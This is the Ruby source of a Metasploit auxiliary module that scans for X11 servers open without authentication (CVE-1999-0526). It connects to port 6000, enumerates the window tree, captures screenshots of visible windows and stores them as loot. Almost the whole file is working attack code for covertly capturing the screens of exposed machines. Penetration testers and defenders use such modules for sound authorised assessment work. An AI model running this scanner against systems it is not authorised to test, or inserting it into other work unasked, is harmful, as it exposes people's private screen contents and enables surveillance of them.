##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'chunky_png'

class MetasploitModule < Msf::Auxiliary
  include Exploit::Remote::Tcp
  include Auxiliary::Scanner
  include Auxiliary::Report
  include Exploit::Remote::X11

  def initialize
    super(
      'Name'	=> 'X11 No-Auth Screenshot Scanner',
      'Description'	=> %q{
        This module scans for X11 servers that allow anyone
        to connect without authentication and takes
        a screenshot as well.
      },
      'Author'	=> [
        'h00die'
      ],
      'References' => [
        ['OSVDB', '309'],
        ['CVE', '1999-0526'],
      ],
      'License'	=> MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => [],
        'RelatedModules' => [
          'auxiliary/gather/x11_keyboard_spy',
        ]
      }
    )

    register_options([
      Opt::RPORT(6000),
    ])
  end

  def read_data_from_network(object, max_attempts = 3)
    received_data = ''
    buffer_size = 1024
    while (chunk = sock.recv(buffer_size))
      received_data += chunk
    
      # Break out of the loop if we've received all the data
      break if chunk.length < buffer_size
    end

    begin
      error = X11ERROR.read(received_data)
      raise StandardError if error.response_type == 1 # reply not an error, try to read the data in
      vprint_bad("Got an error packet: #{error.inspect}")
      return nil
    rescue StandardError
      # check if we got an error packet
      begin
        return object.read(received_data)
      rescue StandardError
        return nil
      end
    end
  end


  def process_extension_query(packet, extension)
    begin
      extension_response = QUERYEXTENSIONRESPONSE.read(packet)
    rescue ::EOFError
      packet += sock
      fail_with(Msf::Module::Failure::UnexpectedReply, "Unable to process QueryExtension Response. Raw packet: #{packet}")
    end

    if extension_response.present == 1
      print_good("  Extension #{extension} is present with id #{extension_response.major_opcode}")
    else
      fail_with(Msf::Module::Failure::UnexpectedReply, "Extension #{extension} is NOT present (#{packet.inspect})")
    end
    extension_response
  end

  def take_screenshot(connection)
    query_extension_calls = 0

    # query extension big-requests
    vprint_status('(2/15) Checking on BIG-REQUESTS extension')
    sock.put(QUERYEXTENSION.new(extension: 'BIG-REQUESTS', unused2: query_extension_calls).to_binary_s) # check if BIG-REQUESTS exist, not sure why
    query_extension_calls += 1
    big_requests_plugin = process_extension_query(sock.get_once(-1, 1), 'BIG-REQUESTS')

    # enable big requests
    vprint_status('(3/15) Enabling BIG-REQUESTS')
    sock.put(EXTENSIONTOGGLE.new(opcode: big_requests_plugin.major_opcode).to_binary_s) # not sure why we do this
    sock.get_once(-1, 1)

    # createGC, GetProperties
    vprint_status('(4/15) Creating new graphical context')
    sock.put(X11CREATEGRAPHICALCONTEXTREQUEST.new(cid: connection.resource_id_base,
                                                  drawable: connection.screen_root,
                                                  gc_value_mask_background: 1).to_binary_s +
             X11GETPROPERTYREQUEST.new(window: connection.screen_root).to_binary_s) # not sure why we do this
    sock.get_once(-1, 1)

    # query extension xkeyboard
    vprint_status('(5/15) Checking on XKEYBOARD extension')
    sock.put(QUERYEXTENSION.new(extension: 'XKEYBOARD', unused2: query_extension_calls).to_binary_s) # check if XKEYBOARD exist, not sure why
    xkeyboard_plugin = process_extension_query(sock.get_once(-1, 1), 'XKEYBOARD')
    query_extension_calls += 1

    # enable xkeyboard
    vprint_status('(6/15) Enabling XKEYBOARD')
    sock.put(EXTENSIONTOGGLE.new(opcode: xkeyboard_plugin.major_opcode, wanted_major: 1).to_binary_s) # use keyboard
    sock.get_once(-1, 1)

    # InternAtom wait
    vprint_status('(7/15) Setting wait on itern atom')
    sock.put(X11INTERNATOMREQUEST.new(name: 'Wait').to_binary_s)
    sock.get_once(-1, 1)

    vprint_status('(8/15) Getting window title atoms')
    sock.put(X11INTERNATOMREQUEST.new(name: '_NET_WM_NAME').to_binary_s +
            X11INTERNATOMREQUEST.new(name: "UTF8_STRING\x00").to_binary_s)
    atom_reply = sock.get_once(-1, 1)
    @window_name_atom = X11INTERNATOMRESPONSE.read(atom_reply[0..atom_reply.length / 2])
    @window_name_atom = @window_name_atom.atom
    @window_string_atom = X11INTERNATOMRESPONSE.read(atom_reply[atom_reply.length / 2..])
    @window_string_atom = @window_string_atom.atom
    vprint_good("  Using UTF8 windows names via atoms [#{@window_name_atom},#{@window_string_atom}]")

    # xkeyboard-bell
    # XXX this prob needs to be removed, we want the -silent option from xwd
    # vprint_status('(9/15) Setting xkeyboard bell')
    # sock.put(BELLREQUEST.new(xkeyboard_id: xkeyboard_plugin.major_opcode).to_binary_s)
    # sock.get_once(-1, 1)

    # getwindowattributes+getgeometry
    query_extension_calls += 1 # XXX not sure why, figure out where we're missing a call
    vprint_status('(10/15) Getting root Window Attributes')
    sock.put(GETREQUEST.new(window: connection.screen_root,
                            opcode: 3, # GetWindowAttributes
                            unused: query_extension_calls).to_binary_s +
            GETREQUEST.new(
              window: connection.screen_root,
              opcode: 14, # GetGeometry
              unused: query_extension_calls + 1
            ).to_binary_s) # not sure why we do this
    sock.get_once(-1, 1)

    # translatecoordinates
    vprint_status('(11/15) Getting coordinates translation')
    sock.put(TRANSLATECOORDINATESREQUEST.new(src_window: connection.screen_root, dst_window: connection.screen_root).to_binary_s)
    sock.get_once(-1, 1)

    # getproperty
    vprint_status('(12/15) Getting propties of root window')
    sock.put(X11GETPROPERTYREQUEST.new(window: connection.screen_root).to_binary_s)
    sock.get_once(-1, 1)

    # InternAtom server_overlay_visuals
    vprint_status('(13/15) Setting Server Overlay Visuals on Itern Atom')
    sock.put(X11INTERNATOMREQUEST.new(name: "SERVER_OVERLAY_VISUALS\x00\x00",
                                      only_if_exists: 1).to_binary_s)
    sock.get_once(-1, 1)

    # getwindowattributes+getgeometry
    vprint_status('(14/15) Getting window attributes and geometry')
    sock.put(GETREQUEST.new(window: connection.screen_root,
                            opcode: 3,
                            unused: 3).to_binary_s +
              GETREQUEST.new(opcode: 14,
                             window: connection.screen_root).to_binary_s)
    sock.get_once(-1, 1)

    # querytree
    vprint_status('(15/15) Getting Tree')
    # @all_windows keeps track of all windows which are bigger than 1x1, aka visible windows.
    @all_windows = []
    get_process_tree(connection.screen_root, '')

    # determine the background image, it will have x/y offsets of 0, and the heigh/width will match the root
    # we go in reverse because we want the top most layer that satisfies these requirements
    vprint_status('(16/15) Getting screenshot(s)')
    @all_windows.reverse.each do |window|
      # next unless window['x'] == 0 &&
      #            window['y'] == 0 &&
      #            window['height'] == connection.screen_height_in_pixels &&
      #            window['width'] == connection.screen_width_in_pixels
      # puts window
      next unless window['width'] > 10
      next if window['name'].blank?

      puts window

      print_good("Found background image: #{window['window_id']} (#{window['window_int']}) => #{window['name']}")
      # puts window.inspect
      sock.put(GETIMAGEREQUEST.new(
        height: window['height'],
        width: window['width'],
        x: window['x'],
        y: window['y'],
        drawable: window['window_int']
      ).to_binary_s)
      puts 'getting image response'
      image = read_data_from_network(GETIMAGERESPONSE, 20)

      next if image.nil?

      puts "asking for color map 0x#{window['color_map'].to_i.to_s(16)}"

      colors_request = GETCOLORSREQUEST.new(color_map: window['color_map'],
                                            pixels: [0, 65793, 131586, 197379, 263172, 328965, 394758, 460551, 526344, 592137, 657930, 723723, 789516, 855309, 921102, 986895, 1052688, 1118481, 1184274, 1250067, 1315860, 1381653, 1447446, 1513239, 1579032, 1644825, 1710618, 1776411, 1842204, 1907997, 1973790, 2039583, 2105376, 2171169, 2236962, 2302755, 2368548, 2434341, 2500134, 2565927, 2631720, 2697513, 2763306, 2829099, 2894892, 2960685, 3026478, 3092271, 3158064, 3223857, 3289650, 3355443, 3421236, 3487029, 3552822, 3618615, 3684408, 3750201, 3815994, 3881787, 3947580, 4013373, 4079166, 4144959, 4210752, 4276545, 4342338, 4408131, 4473924, 4539717, 4605510, 4671303, 4737096, 4802889, 4868682, 4934475, 5000268, 5066061, 5131854, 5197647, 5263440, 5329233, 5395026, 5460819, 5526612, 5592405, 5658198, 5723991, 5789784, 5855577, 5921370, 5987163, 6052956, 6118749, 6184542, 6250335, 6316128, 6381921, 6447714, 6513507, 6579300, 6645093, 6710886, 6776679, 6842472, 6908265, 6974058, 7039851, 7105644, 7171437, 7237230, 7303023, 7368816, 7434609, 7500402, 7566195, 7631988, 7697781, 7763574, 7829367, 7895160, 7960953, 8026746, 8092539, 8158332, 8224125, 8289918, 8355711, 8421504, 8487297, 8553090, 8618883, 8684676, 8750469, 8816262, 8882055, 8947848, 9013641, 9079434, 9145227, 9211020, 9276813, 9342606, 9408399, 9474192, 9539985, 9605778, 9671571, 9737364, 9803157, 9868950, 9934743, 10000536, 10066329, 10132122, 10197915, 10263708, 10329501, 10395294, 10461087, 10526880, 10592673, 10658466, 10724259, 10790052, 10855845, 10921638, 10987431, 11053224, 11119017, 11184810, 11250603, 11316396, 11382189, 11447982, 11513775, 11579568, 11645361, 11711154, 11776947, 11842740, 11908533, 11974326, 12040119, 12105912, 12171705, 12237498, 12303291, 12369084, 12434877, 12500670, 12566463, 12632256, 12698049, 12763842, 12829635, 12895428, 12961221, 13027014, 13092807, 13158600, 13224393, 13290186, 13355979, 13421772, 13487565, 13553358, 13619151, 13684944, 13750737, 13816530, 13882323, 13948116, 14013909, 14079702, 14145495, 14211288, 14277081, 14342874, 14408667, 14474460, 14540253, 14606046, 14671839, 14737632, 14803425, 14869218, 14935011, 15000804, 15066597, 15132390, 15198183, 15263976, 15329769, 15395562, 15461355, 15527148, 15592941, 15658734, 15724527, 15790320, 15856113, 15921906, 15987699, 16053492, 16119285, 16185078, 16250871, 16316664, 16382457, 16448250, 16514043, 16579836, 16645629, 16711422, 16777215],
                                            unused: 2)

      sock.put(colors_request.to_binary_s)

      colors = read_data_from_network(GETCOLORSRESPONSE, 10)

      next if colors.nil?

      x11_image = X11Image.new(window['height'], window['width'], image, colors) # XXX
      image = x11_image.create_image
      f = store_loot('x11.screenshot', 'image/x-png', rhost, image)
      print_good("Image saved to: #{f}")
      # break
    end

    # cleanup
    vprint_status('Performing cleanup')
    sock.put(X11GETINPUTFOCUSREQUEST.new.to_binary_s)
    sock.put(X11FREEGRAPHICALCONTEXTREQUEST.new(gc: connection.resource_id_base).to_binary_s +
              X11GETINPUTFOCUSREQUEST.new.to_binary_s)
  end

  def get_process_tree(window, spaces)
    vprint_status("#{spaces}  Getting children for window 0x#{window.to_i.to_s(16)}")
    sock.put(QUERYTREEREQUEST.new(drawable: window).to_binary_s)

    trees = read_data_from_network(QUERYTREERESPONSE)

    vprint_status("  #{spaces}Found #{trees.children.length} child windows") if !trees.children.empty?
    trees.children.sort.each_with_index do |child_window, i|
      # getwindowattributes+getgeometry
      sock.put(GETREQUEST.new(window: child_window,
                              opcode: 3,
                              unused: 3).to_binary_s +
              GETREQUEST.new(window: child_window,
                             opcode: 14).to_binary_s +
              X11GETPROPERTYREQUEST.new(window: child_window,
                                        property: @window_name_atom,
                                        get_property_type: @window_string_atom).to_binary_s)

      response = sock.get_once(-1, 1)
      attempts = 1
      window_attributes = nil
      window_geometry = nil
      window_name = nil
      while attempts <= 3 && (window_attributes.nil? || window_geometry.nil? || window_name.nil?)
        begin
          window_attributes = GETWINDOWRESPONSE.read(response[0..44])
          window_geometry = WINDOWATTRIBUTESGETGEOMETRYRESPONSE.read(response[44..76])
          window_name = X11GETPROPERTYRESPONSE.read(response[76..])
          break
        rescue StandardError
          vprint_bad("Failed to parse data, attempt #{attempts}/3 to get more")
        end
        tmp_data = sock.get_once(-1, 1)
        response << tmp_data unless tmp_data.nil?
        attempts += 1
      end

      if window_attributes.nil? || window_geometry.nil? || window_name.nil?
        print_bad('Error reading data')
      end

      if window_geometry.width > 1 && window_geometry.height > 1
        @all_windows.append({
          'window_id' => "0x#{child_window.to_i.to_s(16)}",
          'window_int' => child_window,
          'height' => window_geometry.height,
          'width' => window_geometry.width,
          'x' => window_geometry.x,
          'y' => window_geometry.y,
          'color_map' => window_attributes.colormap,
          'name' => window_name.value_data
        })
      end

      if window_attributes.your_event_mask == 0 || window_attributes.your_event_mask == 65536
        vprint_status("#{spaces}#{i + 1}/#{trees.children_len} Window: 0x#{child_window.to_i.to_s(16)} (#{window_name.value_data}) #{window_geometry.width}x#{window_geometry.height}+#{window_geometry.x}+#{window_geometry.y} event_mask: #{window_attributes.your_event_mask}")
      else
        print_good("#{spaces}#{i + 1}/#{trees.children_len} Window: 0x#{child_window.to_i.to_s(16)} (#{window_name.value_data}) #{window_geometry.width}x#{window_geometry.height}+#{window_geometry.x}+#{window_geometry.y} event_mask: #{window_attributes.your_event_mask}")
        get_process_tree(child_window, "  #{spaces}")
      end
    end
  end

  def run_host(ip)
    vprint_status('Establishing TCP Connection')
    connect # tcp connection establish
    vprint_status('(1/15) Establishing X11 connection')
    sock.put(X11CONNECTIONREQUEST.new.to_binary_s) # x11 session establish

    connection = read_data_from_network(X11CONNECTION)

    if connection.nil?
      print_error('Unable to establish x11 session')
      disconnect
      return
    elsif connection.success == 0
      print_error("#{ip} Access Denied")
      disconnect
      return
    end

    print_good("#{ip} - Successly established X11 connection")
    # puts connection.inspect
    vprint_status("  Vendor: #{connection.vendor}")
    vprint_status("  Version: #{connection.protocol_version_major}.#{connection.protocol_version_minor}")
    vprint_status("  Screen Resolution: #{connection.screen_width_in_pixels}x#{connection.screen_height_in_pixels}")
    vprint_status("  Resource ID: #{connection.resource_id_base.inspect}")
    vprint_status("  Screen root: #{connection.screen_root.inspect}")
    report_note(
      host: ip,
      proto: 'tcp',
      sname: 'x11',
      port: rport,
      type: 'x11.server_vendor',
      data: "Open X Server (#{connection.vendor})"
    )
    take_screenshot(connection)

    disconnect
  end
end
